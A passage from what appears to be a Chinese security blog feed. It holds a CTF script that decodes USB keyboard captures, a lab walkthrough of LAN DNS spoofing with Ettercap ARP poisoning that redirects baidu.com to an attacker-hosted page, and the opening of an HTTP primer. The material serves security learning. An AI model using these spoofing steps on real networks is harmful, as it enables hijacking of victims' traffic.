class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage : &quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Tips : &quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Author : &quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        Thank you for using.&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># get data of pcap</span><br>    os.system(<span class="hljs-string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br>    <span class="hljs-comment"># clean the temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python3 UsbKeyboardDataHacker.py key.pcap                                                                                        1 ⨯<br>[-] Unknow Key : 01<br>[-] Unknow Key : 01<br>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<br></code></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a><br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108717829">https://blog.csdn.net/qq_43431158/article/details/108717829</a></p><p>CTF流量分析总结题目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og<span class="hljs-comment">#list/path=%2F</span><br>提取码：q6ro<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>局域网下的DNS欺骗复现</title>
    <link href="/posts/3356937283/"/>
    <url>/posts/3356937283/</url>
    
    <content type="html"><![CDATA[<p>@<a href="%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p><strong>DNS</strong></p><blockquote><p>DNS是Domain Name System的简写，即域名系统，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。简单地说，如果我们想访问岂安科技的官网，本来需要输入网站主机的IP地址，但是DNS可以将<a href="http://www.bigsec.com解析成对应的ip地址,我们就不需要记住复杂的ip地址了./">http://www.bigsec.com解析成对应的IP地址，我们就不需要记住复杂的IP地址了。</a></p></blockquote><p><strong>DNS劫持</strong></p><blockquote><p>域名劫持是互联网攻击的一种方式，通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的IP地址从而实现用户无法访问目标网站的目的或者蓄意或恶意要求用户访问指定IP地址（网站）的目的。</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击机：kali linux（192.168.182.130）<br>靶  机：win7x64位（192.168.182.132）<br>默认网关：192.168.182.2<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以使用下面几个命令查看网关，网关为<code>192.168.182.2</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">route -n<br>ip route show<br>netstat -r<br></code></pre></td></tr></table></figure><p>编辑ettercap的DNS文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/ettercap/etter.dns<br></code></pre></td></tr></table></figure><p>在最后添加一个A记录，将百度的IP设置为攻击机的IP<br><img src="https://img-blog.csdnimg.cn/20210312215725462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置挂马页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /var/www/html/index.html<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210312220149366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启动apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/apache2 start<br>或者<br>service apache2 start<br></code></pre></td></tr></table></figure><p>启动 Ettercap图形化页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ettercap -G<br></code></pre></td></tr></table></figure><p>这里是虚拟机环境，所以是选择eth0 ，然后点击上方的对勾<br><img src="https://img-blog.csdnimg.cn/20210312220504697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将网关和靶机IP依次添加<br><img src="https://img-blog.csdnimg.cn/20210312220805235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>开启arp欺骗，点击上方圆圈，选择ARP Poisoing，然后选择Sniff remote connections嗅探远程的连接，点击OK<br><img src="https://img-blog.csdnimg.cn/20210312220846681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择Manage plugins列出所有插件<br><img src="https://img-blog.csdnimg.cn/20210312221203414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击选中dns_spoof进行攻击<br><img src="https://img-blog.csdnimg.cn/2021031222132736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ping一下百度，得到的回复来自攻击机的IP，说明成功了。<br><img src="https://img-blog.csdnimg.cn/20210312223641717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在靶机中访问<code>https://www.baidu.com</code>，显示拒绝连接<br><img src="https://img-blog.csdnimg.cn/20210312221431543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而访问<code>http://www.baidu.com</code>，显示的攻击机设置的黑页，DNS劫持百度成功。<br><img src="https://img-blog.csdnimg.cn/20210312222117273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    
    <tags>
      
      <tag>DNS欺骗</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入学习HTTP协议</title>
    <link href="/posts/3907386982/"/>
    <url>/posts/3907386982/</url>
    
    <content type="html"><![CDATA[<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><p>超文本传输协议 (HTTP-Hypertext transfer protocol) 是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。通常，由HTTP客户端发起一个请求，建立一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。HTTP使用TCP而不是UDP的原因在于（打开一个）一个网页必须传送很多数据，而TCP协议提供传输控制，按顺序组织数据，和错误纠正。</p><p>从层次的角度看，HTTP是面向事务的(transaction-oriented)应用层协议，它是万维网上能够可靠地交换文件(包括文本、声音、图像等各种多媒体文件)的重要基础。</p><p>交互过程如下：<br><img src="https://img-blog.csdnimg.cn/20210329204302530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>http协议思维导图<br><img src="https://img-blog.csdnimg.cn/20210409104101378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h2><p>1.基于请求/响应模型的协议。</p><ul><li>请求和响应必须成对，先有请求后有响应</li></ul><p>2.简单快速</p><ul><li>客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</li></ul><p>3.灵活</p><ul><li>HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li></ul><p>4.无连接</p><ul><li>每次请求一次，释放一次连接。所以无连接表示每次连接只能处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li></ul><p>5.无状态</p><ul><li>HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>HTTP是基于客户/服务器模式，且面向连接的。典型的HTTP事务处理有如下的过程分为四步：<br>（1）客户与服务器建立连接<br>　　首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作就开始了。<br>（2）客户向服务器提出请求<br>　　建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。<br>（3）服务器接受请求，并根据请求返回相应的文件作为应答<br>　　服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。<br>（4）客户与服务器关闭连接<br>　　 客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>　　如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端。　　</p><h2 id="HTTP协议发展史"><a href="#HTTP协议发展史" class="headerlink" title="HTTP协议发展史"></a>HTTP协议发展史</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>0.9版本是第一个定稿的HTTP版本，相对较为简陋。它有以下特点：</p><ul><li><p>只接受 GET 一种请求方法</p></li><li><p>没有header等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>由于该版本不支持 POST 方法，所以客户端无法向服务器传递太多信息</p><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>1.0版本在0.9版本上做出了很多创新和优化，该版本：</p><ul><li><p>增加了新的命令（POST命令和HEADER命令）</p></li><li><p>增加status code（状态码）和header</p></li><li><p>增加多字符集支持、多部分发送、authorization（权限）、cache（缓存）等</p></li></ul><p>这是第一个在通讯中指定版本号的HTTP 协议版本，在这个版本，基本实现了HTTP协议的框架。</p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>1.1版本解决了大量1.0版本的痛点，该版本新增了以下功能：</p><ul><li><p>持久连接（keep alive）</p></li><li><p>管道化（pipeline）</p></li><li><p>host和其他一些命令</p></li></ul><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0的前身是HTTP1.0和HTTP1.1,是HTTP 协议的第二个主要版本，该版本关注于减少延迟时间，从而提高页面加载速度。HTTP/2 是基于 SPDY 协议的，打开一个 TCP 连接并重复使用，这使得许多请求得以并行发送，而无需等待响应。</p><p>HTTP/2.0优势是:</p><ul><li><p>所有数据二进制传输</p></li><li><p>同一链接多个请求不再按照顺序来</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li></ul><h1 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h1><p>用于HTTP协议交互的信息被称为报文。</p><p>请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP报文本身是由多行数据构成的字符串文本。HTTP报文大致上可分为报文首部和报文主体两块，两者由最初出现的空行来划分。<br>通常来说，并不一定要有报文主体。</p><p>HTTP报文由三部分组成：</p><p>（1)起始行：<br>报文的第一行就是起始行,用于区分是请求报文还是响应报文，请求报文中开始行叫做请求行，而响应报文中，开始行叫做状态行。在开始行的三个字段之间都用空格分开，结尾处 CRLF 